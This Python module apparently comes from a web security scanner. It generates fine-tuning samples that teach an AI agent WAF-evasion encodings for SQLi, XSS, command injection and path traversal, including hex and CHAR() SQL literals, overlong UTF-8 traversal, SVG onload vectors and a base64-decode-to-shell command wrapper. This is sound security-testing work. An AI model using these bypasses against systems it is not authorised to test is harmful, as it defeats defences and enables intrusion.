#!/usr/bin/env python3
"""
redteam_corpus.py — WAF-evasion payload synthesis corpus for QLoRA fine-tuning.

Extends the *payload* SFT task (``ai_module/dataset_generator.py``'s
``build_payload_samples`` / ``data/sft.payload.*.jsonl``) with a curated set of
polymorphic encodings for SQLi / XSS / Command Injection / Path Traversal —
the same four classes the scanner's structured taxonomy already recognises
(:class:`ai_module.structured_inference.VulnClass`).

Scope: this teaches the agent to propose an *already-known-to-work* class of
technique (nested percent-encoding, Unicode/overlong-UTF-8 escapes, hex/numeric
literals, keyword-splitting) as the next candidate once a plain payload gets
blocked — it does not invent novel bypasses. That mirrors how
``ai_module.agent_inference.AgentClient.synthesize_payloads`` is used in
production: :meth:`~web_security_scanner.modules.vulnerability_testers.base_tester_async.VulnerabilityTester._ai_synthesize_payload`
only fires after the static corpus (``web_security_scanner/PAYLOAD/data/``) is
exhausted with no hit, and every suggestion is replayed live and filtered
through the destructive-payload gate before it ever reaches a target -- see
``AUDIT.md`` 1.5 / ``COVERAGE_AUDIT.md`` B1 for why that gate exists.

Base payloads are read straight out of the scanner's own curated corpus
(``web_security_scanner/PAYLOAD/data/<category>.json``) rather than
hand-typed here a second time, so the training seeds and the payloads the
scanner can actually fire in production never drift apart.

Wire-in: ``dataset_generator.py --enable-redteam-corpus`` (opt-in, off by
default) merges :func:`build_redteam_corpus_samples` into the ``payload`` task
before dedup/split -- see the ``_run_task`` call site.
"""
from __future__ import annotations

import json
import random
import re
import urllib.parse
from collections.abc import Callable, Iterator
from dataclasses import dataclass

from web_security_scanner.core.payload_loader import PAYLOAD_DATA_DIR

# --------------------------------------------------------------------------- #
# encoders -- one small, named technique per callable, all pure functions
# --------------------------------------------------------------------------- #


def nested_url_encode(payload: str) -> str:
    """Double percent-encoding: naive WAF regexes match the payload's literal
    form or a single decode pass, not a re-decoded second pass."""
    once = urllib.parse.quote(payload, safe="")
    return urllib.parse.quote(once, safe="")


def unicode_escape(payload: str) -> str:
    """Per-character ``\\u00XX`` JS-style escapes -- defeats substring/regex
    WAF signatures written against the literal ASCII keyword, since the
    browser/interpreter unescapes before the filtered text is ever compared."""
    return "".join(f"\\u{ord(c):04x}" for c in payload)


def overlong_utf8_traversal(payload: str) -> str:
    """Overlong UTF-8 encodings of ``.`` and ``/`` (``%c0%ae``, ``%c0%af``) --
    IIS/older path-normalisation stacks decode these to the ASCII original
    while a signature looking for literal ``../`` or ``%2e%2e%2f`` misses it."""
    return (
        payload.replace("..", "%c0%ae%c0%ae")
        .replace("/", "%c0%af")
        .replace("\\", "%c1%9c")
    )


def hex_literal_sqli(payload: str) -> str:
    """SQL hex literal (``0x...``) in place of a quoted string -- bypasses
    WAFs that only inspect for quote characters / known keyword casing."""
    return "0x" + payload.encode("utf-8").hex()


def inline_comment_split(payload: str) -> str:
    """MySQL inline-comment keyword splitting (``UN/**/ION``) -- defeats a
    signature that matches the whole keyword as one contiguous token."""
    out = []
    for i, c in enumerate(payload):
        out.append(c)
        if c.isalpha() and i > 0 and i % 3 == 0:
            out.append("/**/")
    return "".join(out)


def case_toggle(payload: str) -> str:
    """Alternating case (``SeLeCt``) -- defeats a case-sensitive keyword
    signature without changing behaviour on a case-insensitive SQL engine."""
    return "".join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(payload))


def ifs_substitution(payload: str) -> str:
    """``${IFS}`` in place of a literal space -- bypasses a WAF blocking the
    space character while every POSIX shell still expands ``$IFS`` to it."""
    return payload.replace(" ", "${IFS}")


def base64_shell_wrap(payload: str) -> str:
    """Base64-wrapped command executed via ``echo ... | base64 -d | sh`` --
    the literal command-output/keyword signatures a WAF matches against never
    appear in the request; only the shell ever sees the decoded form."""
    import base64

    inner = payload.lstrip("|;& ").strip()
    b64 = base64.b64encode(inner.encode("utf-8")).decode("ascii")
    return f"echo {b64}|base64 -d|sh"


def html_entity_split(payload: str) -> str:
    """Decimal HTML-entity encoding of alphabetic characters -- defeats a
    signature written against the literal tag/attribute name; the browser's
    HTML parser resolves entities before the DOM (and any WAF regex) sees the
    plain keyword."""
    return "".join(f"&#{ord(c)};" if c.isalpha() else c for c in payload)


def sql_char_concat(payload: str) -> str:
    """Rebuild a quoted string as ``CHAR(n)`` concatenation -- defeats a
    signature keyed on the literal quote character, since the string never
    appears quoted in the request; the DBMS reassembles it from character
    codes at execution time."""
    codes = ",".join(str(ord(c)) for c in payload if c not in "'\"")
    return f"CHAR({codes})" if codes else payload


def versioned_comment_wrap(payload: str) -> str:
    """MySQL version-gated comment (``/*!50000 ... */``) around the payload
    -- a WAF that strips balanced ``/* */`` comments outright removes the
    delimiters and the keyword inside becomes visible again, but a MySQL
    server executes the content unconditionally (the ``!NNNNN`` gate only
    ever *adds* a version floor, never hides the statement from the engine)."""
    return f"/*!00000{payload}*/" if payload else payload


def svg_tag_vector(payload: str) -> str:
    """Swap an assumed ``<script>``/``<img>`` vector for ``<svg onload=...>``
    -- defeats a signature keyed on the ``script`` tag name; the browser
    fires ``onload`` on any SVG element with no user interaction needed.
    Pulls the JS call out of whatever tag shape the base payload used
    (``alert(...)`` in this corpus's canary payloads) so the result is a
    well-formed tag regardless of the input's original vector."""
    match = re.search(r"[A-Za-z_][\w.]*\([^)]*\)", payload)
    js_call = match.group(0) if match else "alert(1)"
    return f"<svg/onload={js_call}>"


def whitespace_tag_split(payload: str) -> str:
    """Insert a tab inside the opening tag name (``<scr\\tipt>``) -- HTML5's
    tokenizer still recognises the tag (whitespace inside a tag name is
    dropped during parsing) while a regex anchored on the contiguous literal
    ``<script`` no longer matches."""
    return payload.replace("<script", "<scr\tipt", 1) if "<script" in payload else payload


def backslash_traversal_mix(payload: str) -> str:
    """Alternate ``/`` and ``\\`` across traversal segments -- a filter that
    only normalises one separator style (common on stacks ported from a
    single OS assumption) leaves the mixed-separator path untouched, while
    the Windows path layer still walks up a directory on either character."""
    segments = payload.split("/")
    if len(segments) < 2:
        return payload
    seps = ["\\" if i % 2 == 0 else "/" for i in range(len(segments) - 1)]
    out = [segments[0]]
    for segment, sep in zip(segments[1:], seps, strict=True):
        out.append(sep)
        out.append(segment)
    return "".join(out)


def null_byte_truncate(payload: str) -> str:
    """Trailing ``%00`` (URL-encoded NUL) -- on a stack that still passes the
    raw byte to a C string API (legacy PHP `` <5.3.4``, some native file
    handlers), the interpreter truncates the string at the NUL, discarding an
    appended allow-listed extension the application code checks for."""
    return f"{payload}%00"


def newline_command_split(payload: str) -> str:
    """URL-encoded newline (``%0a``) instead of ``;``/``|`` as the command
    separator -- a filter denylisting the common shell metacharacters misses
    the newline, which every POSIX shell still honours as a statement
    terminator."""
    for sep in (";", "|", "&&"):
        payload = payload.replace(sep, "%0a")
    return payload


def backtick_substitution(payload: str) -> str:
    """Backtick command substitution in place of ``$(...)`` -- a filter
    written against the ``$(`` token misses the older, functionally
    identical backtick form; every POSIX shell evaluates both the same way."""
    inner = payload.strip()
    if inner.startswith("$(") and inner.endswith(")"):
        inner = inner[2:-1]
    return f"`{inner}`"


def chain(*fns: Callable[[str], str]) -> Callable[[str], str]:
    """Compose techniques left-to-right into one encoder.

    Real WAF-evasion practice rarely stops at one transform -- an operator
    re-encodes the *output* of a blocked technique again once that form is
    also caught. The composed callable is a normal, pure function so it
    slots into ``EVASION_TECHNIQUES`` / ``_TECHNIQUE_NOTE`` like any atomic
    technique above.
    """
    def _chained(payload: str) -> str:
        for fn in fns:
            payload = fn(payload)
        return payload
    return _chained


# Chained (multi-stage) techniques -- defined once at import time so each is
# a stable dict key, matching the atomic techniques above.
sqli_hex_then_nested = chain(hex_literal_sqli, nested_url_encode)
xss_svg_then_unicode = chain(svg_tag_vector, unicode_escape)
pathtraver_overlong_then_null = chain(overlong_utf8_traversal, null_byte_truncate)
cmdi_ifs_then_newline = chain(ifs_substitution, newline_command_split)


# vclass (matches ai_module.structured_inference.VulnClass values) -> techniques
EVASION_TECHNIQUES: dict[str, list[Callable[[str], str]]] = {
    "sqli": [
        nested_url_encode, hex_literal_sqli, inline_comment_split, case_toggle,
        sql_char_concat, versioned_comment_wrap, sqli_hex_then_nested,
    ],
    "xss": [
        nested_url_encode, unicode_escape, html_entity_split, case_toggle,
        svg_tag_vector, whitespace_tag_split, xss_svg_then_unicode,
    ],
    "pathtraver": [
        nested_url_encode, overlong_utf8_traversal, backslash_traversal_mix,
        null_byte_truncate, pathtraver_overlong_then_null,
    ],
    "cmdi": [
        nested_url_encode, ifs_substitution, base64_shell_wrap,
        newline_command_split, backtick_substitution, cmdi_ifs_then_newline,
    ],
}

_TECHNIQUE_NOTE: dict[Callable[[str], str], str] = {
    nested_url_encode: "nested (double) percent-encoding",
    unicode_escape: "per-character Unicode escape sequences",
    overlong_utf8_traversal: "overlong UTF-8 encoding of path separators",
    hex_literal_sqli: "SQL hex-literal encoding",
    inline_comment_split: "inline-comment keyword splitting",
    case_toggle: "alternating-case keyword obfuscation",
    ifs_substitution: "${IFS} substitution for whitespace",
    base64_shell_wrap: "base64-wrapped shell payload",
    html_entity_split: "decimal HTML-entity encoding",
    sql_char_concat: "CHAR()-concatenation string reconstruction",
    versioned_comment_wrap: "MySQL version-gated comment wrapping",
    svg_tag_vector: "alternate SVG-tag XSS vector",
    whitespace_tag_split: "whitespace-split tag name",
    backslash_traversal_mix: "mixed forward/backslash traversal separators",
    null_byte_truncate: "trailing NUL-byte truncation",
    newline_command_split: "newline command separator substitution",
    backtick_substitution: "backtick command substitution",
    sqli_hex_then_nested: "SQL hex-literal encoding, then nested percent-encoding",
    xss_svg_then_unicode: "SVG-tag vector, then per-character Unicode escapes",
    pathtraver_overlong_then_null: "overlong UTF-8 path separators, then trailing NUL truncation",
    cmdi_ifs_then_newline: "${IFS} whitespace substitution, then newline separator substitution",
}

# category file -> vclass, matching ai_module.dataset_generator._TESTER_TO_CATEGORY
_CATEGORY_FILES = {
    "sqli": "sql_injection.json",
    "xss": "xss.json",
    "cmdi": "command_injection.json",
    "pathtraver": "path_traversal.json",
}


@dataclass(frozen=True)
class RedteamSeed:
    vclass: str
    base_payload: str
    technique: Callable[[str], str]
    encoded_payload: str


def _base_payloads(vclass: str, limit: int = 8) -> list[str]:
    """Read a handful of representative ``vector`` strings straight out of
    the scanner's own curated corpus for ``vclass`` (safe, non-destructive
    entries only -- this teaches evasion of the shape the scanner already
    fires, not novel destructive payloads)."""
    path = PAYLOAD_DATA_DIR / _CATEGORY_FILES[vclass]
    try:
        data = json.loads(path.read_text(encoding="utf-8"))
    except (OSError, json.JSONDecodeError):
        return []
    out: list[str] = []
    for entry in data.get("payloads", []):
        if entry.get("min_intrusion_level") == "destructive":
            continue
        vector = entry.get("vector")
        if vector:
            out.append(vector)
        if len(out) >= limit:
            break
    return out


def iter_redteam_seeds(*, seed: int = 1337) -> Iterator[RedteamSeed]:
    """Every (base payload, evasion technique) pair for the four classes."""
    rng = random.Random(seed)
    for vclass, techniques in EVASION_TECHNIQUES.items():
        bases = _base_payloads(vclass)
        for base in bases:
            for technique in techniques:
                try:
                    encoded = technique(base)
                except Exception:  # noqa: BLE001 - a malformed base payload skips, never aborts
                    continue
                if not encoded:
                    continue
                yield RedteamSeed(vclass, base, technique, encoded)
    # Deterministic but not insertion-ordered, so a downstream --limit still
    # samples across all four classes instead of draining sqli first.
    _ = rng  # reserved for future weighted sampling; kept for signature stability


def build_redteam_corpus_samples(*, seed: int = 1337, multiplier: int = 1):
    """Yield ``dataset_generator.Sample``-shaped rows teaching WAF-evasion
    payload synthesis, in the exact ``PayloadOut`` JSON shape the agent's
    ``synthesize_payloads()`` must produce.

    Lazily imports :class:`ai_module.dataset_generator.Sample` and
    ``load_prompt`` to avoid a module-load cycle (``dataset_generator``
    imports this module, not the other way round).
    """
    from ai_module.dataset_generator import Sample
    from ai_module.prompts import load_prompt

    system = load_prompt("payload_system")
    rng = random.Random(seed)
    seeds = list(iter_redteam_seeds(seed=seed))
    rng.shuffle(seeds)
    reps = max(1, int(multiplier))

    # Surface-form variety across repeats so a multiplier > 1 doesn't just
    # dedup back down to one row per (vclass, technique) -- AUDIT.md 2.1 flags
    # exactly this failure mode ("overfitting a formas superficiales") for the
    # hand-written scenario templates; varying the endpoint/param name here
    # keeps the *technique* fixed while the literal surface text differs.
    endpoints = ["/api/search", "/app/profile", "/portal/report",
                 "/service/lookup", "/admin/export", "/shop/item"]
    params = ["q", "id", "file", "target", "ref", "path"]

    for _rep in range(reps):
        for s in seeds:
            note = _TECHNIQUE_NOTE.get(s.technique, "payload transformation")
            endpoint = endpoints[rng.randrange(len(endpoints))]
            param = params[rng.randrange(len(params))]
            user = (
                f"Target: {endpoint}  param={param}\n"
                f"Suspected class: {s.vclass}\n"
                f"Last payload: {s.base_payload!r}\n"
                "  -> scanner_decision=False context=waf_block_page "
                "(WAF/filter rejected the plain payload; response was a "
                "generic 403/406 block page, not application logic)\n"
                "Propose the single most informative next payload and the "
                "signal that would confirm the vulnerability."
            )
            assistant = json.dumps(
                {
                    "payloads": [
                        {
                            "payload": s.encoded_payload,
                            "rationale": (
                                f"The plain form was blocked by a signature-based "
                                f"filter; re-encoding it with {note} preserves the "
                                f"payload's semantics for the target interpreter "
                                f"while no longer matching the filter's literal "
                                f"pattern."
                            ),
                            "confirm_signal": {
                                "sqli": "SQL error string, boolean differential, "
                                        "or time-based delay in the response",
                                "xss": "the decoded payload executing (marker "
                                       "alert/console call) in a rendered DOM, "
                                       "not just reflected as text",
                                "pathtraver": "leaked file contents "
                                              "(/etc/passwd, win.ini) in the body",
                                "cmdi": "command output or a payload-correlated "
                                        "time delay in the response",
                            }[s.vclass],
                            "score": 0.7,
                        }
                    ]
                },
                ensure_ascii=False,
            )
            meta = {
                "label": s.vclass,
                "endpoint": endpoint,
                "param": param,
                "technique": note,
                "redteam_seed": True,
                "_dedup": f"redteam:{s.vclass}:{s.encoded_payload}:{endpoint}:{param}",
            }
            yield Sample(system, user, assistant, meta=meta)
